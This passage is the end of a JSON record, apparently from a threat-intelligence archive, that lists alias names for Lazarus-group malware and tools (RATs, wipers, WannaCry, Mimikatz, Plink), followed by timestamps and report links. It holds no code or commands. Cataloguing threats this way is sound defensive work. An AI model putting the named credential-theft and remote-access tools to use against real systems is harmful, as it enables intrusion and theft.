                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536165,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653787374,
    "ts_modification_date": 1653787374,
    "files": {
        "pdf": "https://archive.orkl.eu/7c0a55d0aa6a8ec5d3934cd2e0c3230e0564bd66.pdf",
        "text": "https://archive.orkl.eu/7c0a55d0aa6a8ec5d3934cd2e0c3230e0564bd66.txt",
        "img": "https://archive.orkl.eu/7c0a55d0aa6a8ec5d3934cd2e0c3230e0564bd66.jpg"
    }
}